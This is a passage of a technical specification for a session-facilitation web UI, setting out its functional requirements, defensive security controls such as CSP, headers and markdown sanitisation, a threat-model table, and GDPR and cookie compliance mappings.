- **FR-004**: WebSocket connection at `ws://<host>:8751/ws/{session_id}` for real-time push events.
- **FR-005**: Server sends `state_snapshot` on WebSocket connect with full session state.
- **FR-006**: Transcript renders markdown with security overrides. Raw HTML stripped. Images neutralized to `[Image: alt]` text. Links with `javascript:` / `data:` / `vbscript:` / `file:` schemes rendered as warning spans. Invisible / bidirectional Unicode code points (U+200B..U+200F, U+202A..U+202E, U+2066..U+2069, U+FEFF) replaced with visible `[LABEL]` markers and each message shows a "⚠ N hidden" count badge.
- **FR-007**: Three-column layout: left sidebar (participants + controls), center (transcript + input), right sidebar (budget + convergence + proposals + review gate).
- **FR-008**: Responsive: sidebars collapse to drawers below 1024px.
- **FR-009**: Facilitator controls gated by role — hidden for non-facilitator participants.
- **FR-010**: Budget dashboard shows per-participant spend vs. limits with data visibility enforcement per privacy policy. Backend derives `spend_daily` from `log_repo.get_participant_cost(pid, period="daily")` and ships it on every `state_snapshot.participants[*]` and on `participant_update` events fired after each persisted AI turn.
- **FR-011**: Convergence sparkline graph of similarity over last 50 turns with threshold line.
- **FR-012**: Review gate queue with Approve/Edit/Reject and timeout countdown. Backed by Phase 1 endpoints: `GET /tools/facilitator/list_drafts`, `POST /tools/facilitator/approve_draft`, `POST /tools/facilitator/reject_draft`, `POST /tools/facilitator/edit_draft`.
- **FR-013**: Proposal tracker with voting and real-time tally updates.
- **FR-014**: Auto-reconnecting WebSocket with exponential backoff. Initial delay 1s, doubles per failure, capped at 30s. Respects close codes (4401 = stop, 4403 = stop, 4429 = backoff with jitter, 1006 = retry).
- **FR-015**: Message injection via text input with Ctrl+Enter send. Backed by `POST /tools/participant/inject_message`.
- **FR-016**: Facilitator admin panel: pending approvals, session config, invite generation, audit log. Backed by `POST /tools/facilitator/{approve_participant,reject_participant,remove_participant,create_invite,transfer_facilitator,set_budget,set_routing_preference}` and the audit rows from `GET /tools/debug/export`.
- **FR-017**: Session export (markdown/JSON) via download button. Backed by `GET /tools/session/{export_markdown,export_json}`.
- **FR-018**: Summary panel rendering the latest structured checkpoint. Backed by `GET /tools/session/summary`.
- **FR-019**: Review-gate pause-scope toggle in the facilitator admin panel (session-wide vs. per-participant). Backed by `POST /tools/facilitator/set_review_gate_pause_scope`.
- **FR-020**: Participant health indicator (active / paused-manual / paused-breaker / offline / pending) with breaker-trip count and recent skip reasons surfaced from the `participant_update` WebSocket event and the participant row in `GET /tools/debug/export`.
- **FR-025** (Phase 3, ships with spec 029): Facilitator admin panel MUST surface a "View audit log" button gated by FR-009 role check AND by `SACP_AUDIT_VIEWER_ENABLED=true` (spec 029 FR-018). The button navigates the SPA to the audit-log panel route. When the master switch is false, the button MUST NOT render. Cross-ref spec 029 FR-018.
- **FR-026** (Phase 3, ships with spec 029): Audit log panel MUST render at route `/session/:id/audit` consuming the `GET /tools/admin/audit_log?session_id=<id>` endpoint per spec 029 FR-001. Columns: timestamp, actor, action label, target, summary. Reverse-chronological order with offset-based pagination at `SACP_AUDIT_VIEWER_PAGE_SIZE` rows per page. Pagination controls (next/previous) consume `next_offset` and `total_count` metadata from the response. The route is gated by FR-009 role check; non-facilitator navigation returns the same 403 surface as other facilitator-only routes.
- **FR-027** (Phase 3, ships with spec 029): Audit log panel MUST surface filter controls for the three axes defined by spec 029 FR-011 — actor (facilitator id, participant id, or `Orchestrator`), action type (any registered action label), time range (start/end timestamps). Filters apply client-side to the loaded page (spec 029 FR-012); a filter-control badge MUST display the count of WS-pushed events that did not match the active filter (spec 029 FR-013). Clearing the filter set restores the full loaded page.
- **FR-028** (Phase 3, ships with spec 029): Row expansion MUST route to the spec 029 inline `DiffRenderer` React component in `frontend/app.jsx` (with pure-logic helpers in `frontend/diff_engine.js`) for action types whose audit row contains non-null `previous_value` and `new_value` columns. DiffRenderer props are `(previousValue, newValue, format='auto')`. For action types without diffable values, expansion MUST render row metadata without invoking the DiffRenderer. The renderer's size thresholds (≤ 50KB main thread; 50KB-500KB Web Worker; > 500KB raw display) are inherited from the spec 029 module's locked constants — spec 011 does not redefine them.
- **FR-029** (Phase 3, ships with spec 029): Rows whose registry entry sets `scrub_value=true` (spec 029 FR-014) MUST render `[scrubbed]` placeholders for `previous_value` and `new_value`. Rows whose action string is unregistered MUST render `[unregistered: <raw_action>]` per spec 029 FR-015. Live `audit_log_appended` WebSocket events (spec 029 FR-010) MUST be applied to the panel within 2s of the row's INSERT, subject to the active filter set per FR-027.
- **FR-030** (Phase 3, ships with spec 023): The SPA landing MUST render an auth gate offering "log in" and "create account" when `SACP_ACCOUNTS_ENABLED=true` (spec 023 FR-018). When the master switch is `false`, OR when `SACP_TOPOLOGY=7` (spec 023 research §12), the auth gate MUST NOT render and the existing token-paste landing MUST remain the entry point. When the gate IS rendered, a "use a token instead" link MUST remain available so existing token-only flows (operator-tested deployments, OAuth-future deployments) continue to work without an account. The login form posts to `POST /tools/account/login` per spec 023 FR-007; the create-account form posts to `POST /tools/account/create` per spec 023 FR-005 followed by a verification-code submission UI calling `POST /tools/account/verify` per spec 023 FR-006.
- **FR-031** (Phase 3, ships with spec 023): A post-login session list panel MUST render after a successful login by consuming `GET /me/sessions` per spec 023 FR-008. The response's `active_sessions` array MUST render first; `archived_sessions` MUST render second. Each entry MUST display session name, last-activity-at, and the user's role within the session. Clicking an active entry MUST trigger `POST /me/sessions/{session_id}/rebind` (spec 023 research §10) and navigate the SPA into the session view; clicking an archived entry MUST open the read-only transcript view per spec 001 archived-session semantics with injection / control affordances disabled. Each segment MUST paginate independently at `SACP_AUDIT_VIEWER_PAGE_SIZE`-equivalent default (50/page per spec 023 FR-008); when the joined-session count exceeds 10,000 the SPA MUST surface the structured WARN log entry for facilitator awareness (spec 023 research §9). Empty session arrays MUST render an empty state, NOT a 404 (spec 023 FR-008 acceptance scenario 4).
- **FR-032** (Phase 3, ships with spec 023): An account-settings panel MUST render under the post-login session list, surfacing email change, password change, and account deletion. The email-change flow MUST post `POST /tools/account/email/change` (spec 023 FR-010) and render a verification-code entry UI; the SPA MUST display a status note that the OLD email has received an informational heads-up notification (spec 023 clarify Q11). The password-change flow MUST post `POST /tools/account/password/change` (spec 023 FR-011) requesting current password + new password + confirmation; on success, the SPA MUST display a "session refreshed — other devices logged out" toast (the actor's current sid survives per spec 023 clarify Q12). The account-deletion flow MUST render a typed-confirmation modal posting to `POST /tools/account/delete` (spec 023 FR-012); on success, the SPA navigates to a post-deletion landing summarising the export-on-delete emit and the email grace window (`SACP_ACCOUNT_DELETION_EMAIL_GRACE_DAYS`, default 7).
- **FR-033** (Phase 3, ships with spec 023): The SPA MUST handle the `invalid_credentials` 401 response uniformly for non-existent-email and existing-email-with-wrong-password (spec 023 SC-005 timing-attack resistance contract). The login form MUST display a generic "invalid email or password" error in both cases — no information leak between the two failure modes. The 429 response (per-IP rate limit exceeded per spec 023 FR-015) MUST display a "too many login attempts" error including the `Retry-After` header value rendered as a countdown.
- **FR-034** (Phase 3, ships with spec 023): No new WebSocket events are introduced by the account surface (spec 023 research §11). Password-change-driven session invalidation surfaces as an HTTP 401 on the next `SessionStore`-gated request from the affected sids; the SPA MUST handle that 401 via the existing FR-014 close-code handler, redirecting to the auth gate. Account-related audit events (`account_create`, `account_login`, `account_email_change_consumed`, etc., per spec 023 contracts/audit-log-events.md) MUST flow through the existing `audit_log_appended` WebSocket event channel from spec 029 when the audit panel is open AND the audit-viewer master switch is on; no spec-023-specific WS handler is required.
- **FR-021** (Phase 3, ships with spec 025): Session-create modal (US11 flow) MUST offer a session-length cap control set: four presets (Short / Medium / Long / Custom) plus, when Custom is selected, hand-set inputs for time and turn caps. Submission posts `length_cap_kind`, `length_cap_seconds`, `length_cap_turns` to the session-create endpoint. Cross-ref spec 025 FR-023.
- **FR-022** (Phase 3, ships with spec 025): Facilitator session-settings panel (US6 admin panel) MUST surface the same cap control set as FR-021 plus a current-elapsed display so the facilitator sees the counter they're setting against. Submission targets the cap-set endpoint per `contracts/cap-set-endpoint.md` in spec 025. The control is gated by FR-009 role check (facilitator-only); non-facilitators MUST NOT see the cap fields in any UI surface (cross-ref spec 025 FR-019).
- **FR-023** (Phase 3, ships with spec 025): A conclude-phase banner MUST render at the top of the participant view when the SPA receives a `session_concluding` WS event. Banner copy reads "Session is concluding — N turns left" or "Session is concluding — N minutes left" depending on `trigger_reason`; both lines when `trigger_reason='both'`. The banner consumes `remaining.turns` and `remaining.seconds` from the event payload (cross-ref `contracts/ws-events.md` in spec 025) and never reads the cap values themselves. The banner clears on `session_concluded` OR on a `loop_state_changed` event with `loop_state='running'` (cap-extension exit per spec 025 FR-013).
- **FR-024** (Phase 3, ships with spec 025): When the cap-set endpoint returns HTTP 409 with `error='cap_decrease_requires_interpretation'`, the SPA MUST render a modal presenting both interpretation options (`absolute` / `relative`) with the consequence text from the 409 response body. Modal options route to a re-POST that sets the explicit `interpretation` field per spec 025 FR-026. The modal MUST NOT auto-pick a default — the facilitator's choice is required (matches the user-stated rule that intent is captured rather than guessed).
- **FR-035** (Phase 3, ships with spec 022): Facilitator admin panel MUST surface a "View detection history" button gated by FR-009 role check AND by `SACP_DETECTION_HISTORY_ENABLED=true` (spec 022 FR-016). The button navigates the SPA to the detection-event history panel route. When the master switch is `false`, the button MUST NOT render. Cross-ref spec 022 FR-016.
- **FR-036** (Phase 3, ships with spec 022): Detection-event history panel MUST render at route `/session/:id/detection_events` consuming the `GET /tools/admin/detection_events?session_id=<id>` endpoint per spec 022 FR-001. Rows display event id, event class label (from the spec 022 paired class registry per `frontend/detection_event_taxonomy.js`), participant id, truncated trigger snippet (per FR-039), detector score, timestamp (via spec 029's `formatIso`), and disposition. Newest-first chronological order per spec 022 research §12 with a sort-toggle button flipping to oldest-first. The route is gated by FR-009 role check; non-facilitator navigation returns the same 403 surface as other facilitator-only routes.
- **FR-037** (Phase 3, ships with spec 022): Detection-event panel MUST surface four filter controls (type, participant, time range, disposition) per spec 022 FR-011. Type filter offers the five class keys plus `all`; participant filter is derived client-side from the loaded event set's distinct `participant_id` values plus `all`; time-range filter ships preset chips (`5m`, `15m`, `1h`, `all`) plus a collapsible custom-range datepicker (per spec 022 research §9); disposition filter offers the four enum values plus `all`. Filters compose with AND semantics and apply client-side (no server round-trip). Each filter control MUST surface a hidden-events badge counting events excluded by that axis alone; "Clear filters" resets all four axes plus the sort toggle to defaults.
- **FR-038** (Phase 3, ships with spec 022): Live `detection_event_appended` WebSocket events (spec 022 FR-009) MUST be applied to the panel within 2s. Events matching the active filter set render inline at the top of the panel; events excluded by the filter increment the per-axis hidden-events badges from FR-037 without rendering. The same applies for `detection_event_resurfaced` events from the FR-006 re-surface POST: the re-broadcast banner re-renders in the live UI (Sweep 3 wire-up), and the row's disposition timeline (click-expand fetch) updates if currently rendered for that event id.
- **FR-039** (Phase 3, ships with spec 022): The panel MUST render an empty-state message when the response carries zero events ("No detection events for this session yet"). Trigger snippet rendering MUST truncate at 200 characters with an inline `[expand]` link revealing the full snippet (no refetch — the GET response carries the full string). Rows whose `event_class` is not in the frontend `EVENT_CLASSES` registry MUST render `[unregistered: <class>]` per the parity-gate fallback contract (no panel crash on registry drift; matches spec 029 FR-015's pattern for unregistered audit actions).
- **FR-040** (Phase 3, ships with spec 022): Each row in the detection-event history panel MUST surface a "Re-surface" button that POSTs to `/tools/admin/detection_events/<event_id>/resurface` per spec 022 FR-006. The button is gated by FR-009 role check AND by `SACP_DETECTION_HISTORY_ENABLED=true` (mirroring FR-035 — non-facilitators and master-switch-off deployments MUST NOT see the affordance). For archived sessions the button MUST render in a disabled state with a tooltip reading "re-surface requires an active session" per spec 022 FR-008 + acceptance scenario US2.4. Successful POSTs return `audit_row_id` (cross-ref spec 022 contracts/resurface-endpoint.md), which the SPA correlates with the inbound `detection_event_resurfaced` WS event (FR-038) to confirm round-trip; HTTP 409 responses MUST surface as a transient inline error on the row without tearing down the panel. Added 2026-05-11 during spec 022 pass 1 closeout to close the implicit-action-button gap left by FR-035..FR-039.
- **FR-041** (Phase 3, ships with spec 022): SPA cross-instance reconciliation — the detection-event history panel MUST refetch the current page via spec 022 FR-001 on (a) WebSocket reconnect AND (b) browser window-focus return after a documented inactivity threshold (concrete value settled at spec 022 pass 2 plan time). The refetch substitutes for at-least-once cross-instance push (spec 022 FR-009 best-effort contract per Session 2026-05-11 Pass 1 closeout clarification): a Postgres LISTEN/NOTIFY drop between orchestrator instances silently loses the message, and the refetch is how the panel recovers eventual consistency. The reconciliation MUST be idempotent — matching event ids dedupe against the rendered set; new ids prepend at the top. Added 2026-05-11 to pin the SPA contract for the FR-009 best-effort failure mode.
- **FR-052** (Phase 3, ships with spec 027): Participant card MUST render a `wait_mode` badge for AI participants (i.e. `provider != 'human'`) reflecting their current value (`wait_for_human` / `always`). The badge is gated by FR-009 role check (facilitator-only); non-facilitators MUST NOT see the badge. Cross-ref spec 027 FR-001. The badge is derived in `frontend/standby_ui.js:formatWaitModeBadge`.
- **FR-053** (Phase 3, ships with spec 027): Participant card MUST render a "Standby" pill when the participant's `status='standby'`, distinct from existing `paused-manual` / `paused-breaker` indicators (FR-020). Pill copy: "Standby — awaiting human" / "Standby — awaiting review gate" / "Standby — awaiting vote" / "Standby — filler heuristic tripped" derived from the latest `participant_standby` WS event payload's `reason` field. Pill clears on `participant_standby_exited`. Cross-ref spec 027 FR-010 / FR-011. The copy resolution lives in `frontend/standby_ui.js:formatStandbyPill`.
- **FR-054** (Phase 3, ships with spec 027): Facilitator admin panel MUST expose a `wait_mode` toggle per participant (two-position control: `wait_for_human` / `always`) posting to `POST /tools/participant/set_wait_mode` per spec 027 FR-025 + `contracts/wait-mode-endpoint.md`. The control is gated by FR-009 role check; non-facilitators MUST NOT see the toggle. The current value is read from the participant row served by the existing participant snapshot path.
- **FR-055** (Phase 3, ships with spec 027): Pivot messages — `messages` rows with `metadata.kind === 'orchestrator_pivot'` — MUST render with a banner-style affordance distinct from regular participant turns AND from other system messages. The renderer reads the metadata key directly via `frontend/standby_ui.js:isPivotMessage`; no separate API call. Cross-ref spec 027 FR-018.
- **FR-056** (Phase 3, ships with spec 027): Long-term-observer participants (`wait_mode_metadata.long_term_observer === true`) MUST render a distinct badge variant on their participant card with copy "Long-term observer — human absent". The badge is gated by FR-009 role check. Cross-ref spec 027 FR-020. The detection + copy live in `frontend/standby_ui.js:isLongTermObserver` and `formatLongTermObserverBadge`.
- **FR-057** (Phase 3, ships with spec 027): The participant-card layout MUST tolerate the combined presence of the `wait_mode` badge + standby pill + long-term-observer badge variant without overflowing the card's bounded width on a standard 1280px-wide Phase 1+2 viewport. Badge copy exceeding 24 characters MUST truncate with an inline `[expand]` link revealing the full text (mirrors the FR-039 detection-event snippet pattern).
- **FR-058** (Phase 3, ships with spec 027): The `participant_update` WS event payload (spec 002 §FR-016) MUST include the participant's current `wait_mode` and `wait_mode_metadata` fields so the SPA can render FR-052..FR-057 from a state-snapshot reconnect path AND from any mid-session update without a polling refetch. Cross-ref spec 027 contracts/ws-events.md "participant_update extension".
- **FR-059** (Phase 3, ships with spec 027): The five spec 027 audit-action labels (`standby_entered`, `standby_exited`, `pivot_injected`, `standby_observer_marked`, `wait_mode_changed`) MUST appear in the spec 029 audit-log viewer (when `SACP_AUDIT_VIEWER_ENABLED=true`) with the human-readable strings registered in `src/orchestrator/audit_labels.py` and mirrored in `frontend/audit_labels.js`. The CI parity gate (`scripts/check_audit_label_parity.py`) enforces equality. Cross-ref spec 027 FR-029.

### Security Requirements

- **SR-001**: CSP header. `script-src 'self' 'unsafe-eval' 'unsafe-inline' https://unpkg.com https://cdn.jsdelivr.net` — the two pinned CDN origins are required by FR-002 (CDN-loaded, no build toolchain), `'unsafe-eval'` is required by Babel Standalone's runtime JSX compilation via `new Function(...)`, and `'unsafe-inline'` is required because Babel injects the transpiled module back into the DOM as an inline `<script>` element that `script-src-elem` would otherwise block. The precompile-at-build alternative is tracked for a future phase when a frontend toolchain is introduced. SRI integrity attributes are required on every cross-origin CDN `<script>` (task T204); `frontend/app.jsx` is a same-origin static asset and therefore exempt from SRI. `connect-src 'self' <SACP_WEB_UI_MCP_ORIGIN> <ws-equivalent> <SACP_WEB_UI_WS_ORIGIN>` — operator sets the env vars to their deployment's MCP and Web UI WS origins; the previous broad `ws: wss:` was tightened to explicit origins to close an exfiltration channel if any future XSS slips past DOMPurify. `default-src 'self'`, `style-src 'self' 'unsafe-inline'`, `img-src 'self'`, `font-src 'self'`, `object-src 'none'`, `frame-ancestors 'none'`, `base-uri 'self'`, `form-action 'self'`, `report-uri /csp-report`. No `data:` URIs for images. CSP violations POST to `/csp-report` (logged at WARNING, returns 204) so silent regressions are visible in server logs; the endpoint is exempt from CSRF-header enforcement because browsers cannot add custom headers to violation reports.
- **SR-001a**: WebSocket frame size MUST be capped (default 256 KB via `ws_max_size` on the uvicorn config in `src/run_apps.py`). The default uvicorn cap is 16 MB, which is large enough that a malicious server (or compromised orchestrator) could OOM a browser tab via a single oversized frame. SACP messages are bounded above by `MAX_MESSAGE_CONTENT_CHARS = 2_000` so 256 KB leaves comfortable headroom for state_snapshot payloads while closing the OOM surface.
- **SR-002**: Security headers on all responses (canonical values pinned in `src/web_ui/security.py`):
  - `Strict-Transport-Security: max-age=31536000; includeSubDomains` (1 year, includes subdomains).
  - `X-Content-Type-Options: nosniff`.
  - `X-Frame-Options: DENY`.
  - `Referrer-Policy: no-referrer`.
  - `Permissions-Policy: camera=(), microphone=(), geolocation=()`. Phase 1 denies camera, microphone, and geolocation; additional directives (`payment=()`, `usb=()`, `magnetometer=()`, `xr-spatial-tracking=()`) are deferred — trigger: when Web UI introduces any feature that touches a Permissions-Policy-controlled API.
  - `Cache-Control: no-store` (SR-008).
- **SR-003**: CORS restricted to own origin only. No wildcard.
- **SR-004**: WebSocket upgrade validates Origin header. Missing or mismatched origins closed with 4403. Allowed origins come from `SACP_WEB_UI_ALLOWED_ORIGINS` (CSV), defaulting to same-origin (Origin matches the request's own `Host`). Required by constitution §9.
- **SR-005**: No `dangerouslySetInnerHTML` on unsanitized content. Only on markdown-rendered output with security overrides active.
- **SR-006**: CSRF protection via `X-SACP-Request: 1` custom header on all mutations.
- **SR-007**: API keys and system prompts never displayed in the UI.
- **SR-008**: `Cache-Control: no-store` on all API responses and the HTML page (also tracked in SR-002 for consolidation).
- **SR-009**: Markdown link rendering MUST add `rel="noreferrer noopener"` to every `<a>` tag with `target="_blank"`. Forbidden URL schemes for `<a href>`: `javascript:`, `data:`, `vbscript:`, `file:` (current Phase 1 set in `frontend/app.jsx`). Additional schemes (`chrome-extension:`, `moz-extension:`, `intent:`, `ms-windows-store:`) are deferred to Phase 3; trigger: any deployment that observes a renderable href with a non-allowlisted scheme.
- **SR-010**: Pending participants (002 §FR-020 + §US12) MUST receive a filtered state_snapshot containing session name and human-participant list only — no transcript, no AI roster. Filtering is applied at `src/web_ui/snapshot.py:_pending_snapshot`. Ongoing WebSocket events (message, convergence_update, review_gate_staged) for pending participants are NOT separately filtered in Phase 1+2: pending participants connected via WebSocket may receive transcript-relevant events. Filter-on-broadcast is deferred to Phase 3 — trigger: any operator observation that pending participants gleaned transcript content from live events. The mechanism (`broadcast_to_session_roles`) already exists in `src/web_ui/websocket.py`; activation requires routing each call site through the role-aware variant.
- **SR-011**: Sensitive participant fields (`api_key_encrypted`, `auth_token_hash`, `bound_ip`, `system_prompt`) MUST be stripped from WS state_snapshot payloads at the server-side allow-list serializer (`_participant_dict` in `src/web_ui/snapshot.py`). The Web UI defends in depth: even if the server forgets, the React renderer's allow-list silently drops unknown / sensitive keys. Defense-in-depth is intentional duplication — see also 010 §FR-4 / §FR-9 for the debug-export equivalent and CI guard.
- **SR-012**: Malformed WebSocket frames received by the client (invalid JSON, missing required fields) MUST be discarded with a `console.warn` log; the WebSocket connection MUST NOT be torn down. The client re-syncs at the next `state_snapshot` event (sent on reconnect per FR-005) so transient parser failures don't propagate user-facing errors.

### Key Entities

- **SessionView**: The main UI container binding a user to one session's real-time state.
- **WebSocket Event**: A server-push message (message, participant_update, convergence_update, etc.).
- **ReviewGateDraft**: An AI response staged for human approval before entering the transcript.
- **Proposal**: A decision item with voting from participants.
- **Summary**: A structured checkpoint (decisions, open questions, key positions, narrative) generated periodically by the turn loop and returned by `GET /tools/session/summary`.
- **ParticipantHealth**: Derived status combining `status`, `consecutive_timeouts`, and recent `routing_log` skip entries for a participant, used by the health indicator.

## Success Criteria *(mandatory)*

### Measurable Outcomes

- **SC-001**: Facilitator can create a session, add participants, inject messages, and monitor the loop entirely from the Web UI — no Swagger needed.
- **SC-002**: New AI turns appear in the transcript within 2 seconds of completion via WebSocket.
- **SC-003**: WebSocket reconnects within 30 seconds of a network drop and resyncs state.
- **SC-004**: All XSS test vectors (script tags, markdown images, javascript: links, invisible Unicode) are neutralized in rendered output.
- **SC-005**: Budget dashboard shows real cost data matching debug/export values.
- **SC-006**: Review gate drafts can be approved/rejected from the UI, with the result appearing in the transcript.
- **SC-008** (Phase 3, ships with spec 029): Audit log viewer flows are end-to-end exercisable — the facilitator opens the audit panel from the admin button, sees rows render with human-readable labels, expands a `review_gate_edit` row to inspect a side-by-side diff, applies an actor + action filter, sees a new audit event arrive via WS push within 2s, and a non-facilitator user is rejected from the route. Verified by Playwright e2e per the Phase B testability framework decision.
- **SC-007** (Phase 3, ships with spec 025): Length-cap UI flows are end-to-end exercisable — facilitator sets a cap at session-create AND mid-session, the conclude banner renders for all connected participants on `session_concluding`, the disambiguation modal appears on cap-decrease and routes to a successful 200 commit on either choice. Verified by Playwright e2e per the Phase B testability framework decision.

## Assumptions

- Phase 1 MCP API (port 8750) remains the backend. The Web UI adds a second FastAPI app on port 8751 that proxies to the same database and services.
- No build toolchain — React, ReactDOM, and marked loaded from CDN. All components in a single HTML file (or small number of JS modules).
- Dark theme default. Light theme toggle is desirable but not required for initial ship.
- WebSocket is server-push only. Client mutations go through REST endpoints. The WebSocket carries `pong` and `subscribe` messages from client.
- Virtualized transcript scrolling deferred until performance degrades (simple DOM rendering with ~200 message cap initially).
- Session creation wizard, invite/onboarding flow, and export UI are simple enough to implement directly from the API spec — no separate sub-specs needed.
- Branching UI, sub-session navigation, and OAuth 2.1 are Phase 3 — not in scope here.
- Accessibility audit (keyboard nav, ARIA, screen reader) is a follow-up pass after initial implementation.

## Threat model traceability

| FR / SR | Defends against | OWASP ASVS L2 v4.0.3 | NIST SP 800-53 |
|---------|------------------|----------------------|----------------|
| FR-003, FR-014, SR-009 (token storage + WS close codes + safe link rels) | Token theft, window-name attacks, replay | V3.4, V3.7 | IA-2, SC-23 |
| FR-006, SR-005, SR-009 (markdown sanitization + scheme blocking) | XSS, exfiltration via malicious URLs | V14.4 | SI-15 |
| FR-009, FR-016 (role-gated controls + admin panel) | Privilege escalation in browser | V4.1 | AC-3 |
| SR-001, SR-001a (CSP + WS frame cap + report-uri) | XSS, inline-script injection, OOM via WS frame, silent CSP regression | V14.4 | SI-15, SC-5, AU-2 |
| SR-002 (HSTS / X-Content-Type-Options / X-Frame-Options / Referrer-Policy / Permissions-Policy / Cache-Control) | Downgrade attack, MIME-sniff XSS, clickjacking, referrer leak, capability misuse, sensitive-state caching | V14.3, V14.4 | SC-7, SC-8, SC-23 |
| SR-003, SR-004 (CORS strict + WS Origin validation) | Cross-origin reuse of authenticated session | V14.5 | SC-7 |
| SR-006 (custom CSRF header) | CSRF on mutation endpoints | V13.2 | SC-23 |
| SR-007, SR-011 (no API-keys/system-prompts in UI + defense-in-depth strip) | Credential / system-prompt leak via UI | V14.3 | SC-28 |
| SR-008 (Cache-Control: no-store) | Sensitive state cached by browser / proxy | V14.4 | SC-28 |
| SR-010 (pending-snapshot filter) | Pre-approval information disclosure | V4.2 | AC-3 |
| SR-012 (graceful WS frame parser) | Malformed-input crash / DoS | — | SI-10 |

Sister cross-references: token rotation invalidates the UI session via 002 §FR-008 + this spec FR-003; markdown sanitization runs server-side at 007 §FR-001 / §FR-006 / §FR-007 and again at the renderer (defense in depth); the SSE-side counterpart to SR-001a's WS frame cap is 006 §FR-013 (bounded queue with drop-on-full); the sensitive-field allow-list mirrors 010 §FR-9's CI guard.

### GDPR / ePrivacy article mapping (Phase D fix/011-compliance, 2026-05-02)

Authoritative project-wide GDPR mapping is in `docs/compliance-mapping.md`. The 011-specific mappings are:

| FR / SR | Article | Mapping |
|----|----|----|
| `sacp_session` cookie | ePrivacy Art. 5(3) "strictly necessary" exemption | No consent banner required for auth indicator |
| US12 join flow | Art. 13 | Operator's responsibility (info-to-be-provided UI lives in operator wrapper) |
| SR-001 CSP + report-uri | Art. 32(1)(b) | Confidentiality + integrity of UI state |
| SR-001 third-party CDN | Art. 44 | International transfer (browser → jsDelivr / unpkg); operator-DPIA item |
| SR-007 (no keys / system-prompts in UI) | Art. 32(1)(a) | Confidentiality of operator secrets |
| SR-010 (pending-snapshot filter) | Art. 5(1)(c) | Data minimization on pre-approval state |
| SR-011 (WS strip-list) | Art. 5(1)(c), Art. 32(1)(a) | Data minimization + pseudonymisation at WS boundary |
| SR-012 (graceful WS parser) | Art. 32(1)(c) | Availability of UI under malformed input |
| Phase 3 self-service download | Art. 15, Art. 20 | Subject access + portability (deferred) |

## Compliance / Privacy (Phase D fix/011-compliance, 2026-05-02)

This section documents 011's privacy posture around cookies, third-party CDN risk, CSP reporting, and the WS data-minimization boundary. Authoritative project-wide compliance mapping is in `docs/compliance-mapping.md`.

### Cookie classification (ePrivacy / GDPR Art. 7)

The Web UI uses ONE cookie:

| Cookie | Purpose | Classification | Consent required? |
|----|----|----|----|
| `sacp_session` (HttpOnly, Secure, SameSite=Strict) | Authenticated-session indicator post-login (per FR-003) | Strictly necessary (ePrivacy Art. 5(3) exemption) | No |

No marketing, analytics, or fingerprinting cookies. No third-party cookies. ePrivacy's "strictly necessary" carve-out applies — the cookie is required to deliver the service the user explicitly requested (authenticated session).

If future Phase 3 features add any non-strictly-necessary cookie (analytics, A/B testing, marketing), the operator MUST add a compliant consent UI before deploying — SACP does not currently bundle one.

### Lawful basis on join (Art. 6 / Art. 13)

US12 request-to-join flow surfaces the participant's sign-in but does NOT presently surface a lawful-basis selection or Art. 13 information-to-be-provided notice. This is the operator's responsibility:

- Lawful basis is determined at the deployment-policy layer (see 002 Compliance / Privacy section, "Lawful basis (Art. 6)")
- The operator's onboarding / consent UI MUST surface Art. 13 information (controller identity, purposes of processing, retention, subject-rights routing) BEFORE the participant joins
- SACP itself does not present this UI — it surfaces participant role + session visibility on connect (FR-003 + `state_snapshot`)

Phase 3 trigger: any deployment serving EU data subjects where the Web UI is the primary participant-facing surface (no operator wrapper). At that point, an Art. 13 modal MUST be added to the join flow with operator-supplied controller info.

### CSP report-uri PII handling (SR-001)

`/csp-report` receives CSP violation reports. Violation reports may contain:

- Blocked-URL fragments (path + query string of the violating resource) — may include PII if a malicious script attempted to exfiltrate via URL
- Referrer (page that loaded the violating script) — minimized by `Referrer-Policy: no-referrer` (SR-002)
- Source-file location of the violating script

Retention and access policy:

- Endpoint logs at WARNING level
- Logs flow through 007 §FR-012 root-logger ScrubFilter (credential pattern redaction applies)
- Retention: tied to operator's overall application log retention policy (NOT a separate purge); Phase 3 trigger: any deployment with regulatory log-retention requirements demanding a separate purge schedule
- Access: operator-internal (server-side log access)

The `/csp-report` endpoint is exempt from CSRF-header enforcement because browsers cannot add custom headers to violation reports — this is a documented carve-out, not a CSRF gap.

### Third-party CDN risk (Art. 44, ePrivacy)

The Web UI loads two third-party CDN origins per SR-001 / FR-002:

| Origin | Purpose | Data leak |
|----|----|----|
| `cdn.jsdelivr.net` | React / ReactDOM / marked / DOMPurify | Browser → jsDelivr (Cloudflare-fronted): referrer (`no-referrer` minimizes) + client IP |
| `unpkg.com` | Babel Standalone | Browser → unpkg (Cloudflare-fronted): referrer + client IP |

For EU deployments serving EU data subjects, every browser request to these CDNs is a third-country transfer under Art. 44. The transfer is initiated by the participant's browser (not the orchestrator) so SACP's role is upstream — but operators MUST be aware:

- jsDelivr is operated by ProspectOne (Poland) on Cloudflare infrastructure (US / global)
- unpkg is operated by Cloudflare directly (US / global)
- Both serve over HTTPS; SR-002's `Referrer-Policy: no-referrer` minimizes the referrer leak; client IP is unavoidable

SRI integrity attributes (SR-001 task T204) protect against tampered CDN responses but do not address the IP / referrer transfer.

**Phase 3 mitigation**: bundle the static assets server-side (eliminate the CDN dependency). Trigger: any EU deployment where third-party CDN transfer is unacceptable to the operator's DPIA. The CDN approach was chosen for Phase 1 simplicity (no build toolchain per FR-002); a build pipeline is the prerequisite for self-hosting.

### Confidentiality controls (Art. 32)

Two SRs serve as PII-equivalent confidentiality controls at the UI boundary:

- **SR-007** ("no API keys / system prompts in UI"): system prompts may contain operator-supplied instructions and business logic; they are confidentiality-sensitive even though not classical PII. SR-007 enforces server-side that they never enter the WS payload. Cross-ref 010 §FR-9 (debug-export equivalent).
- **SR-011** (sensitive-field strip-list at WS boundary): `api_key_encrypted`, `auth_token_hash`, `bound_ip`, `system_prompt` stripped at `_participant_dict` serializer. This is data minimization at the WS broadcast boundary (Art. 5(1)(c)). The Web UI's React renderer adds defense-in-depth via allow-list serialization; even if the server forgets, the client silently drops unknown keys.

### Subject rights at the UI boundary

**Self-service Art. 15 / Art. 20**: deferred to Phase 3 (sister 010 Compliance / Privacy section is authoritative). No browser-side download surface for "my session history" exists today. Phase 1 fulfilment is operator-mediated via 010 debug-export + manual filtering. Phase 3 trigger: any deployment serving EU data subjects where the Web UI is the primary participant-facing surface. At that point, a participant-facing "download my data" button surfaces alongside the existing UI.

### Cross-references

- `docs/compliance-mapping.md` — project-wide GDPR mapping (Art. 5(c) / 13 / 32 / 44 rows authoritative)
- 002 Compliance / Privacy section — auth-surface lawful-basis + retention
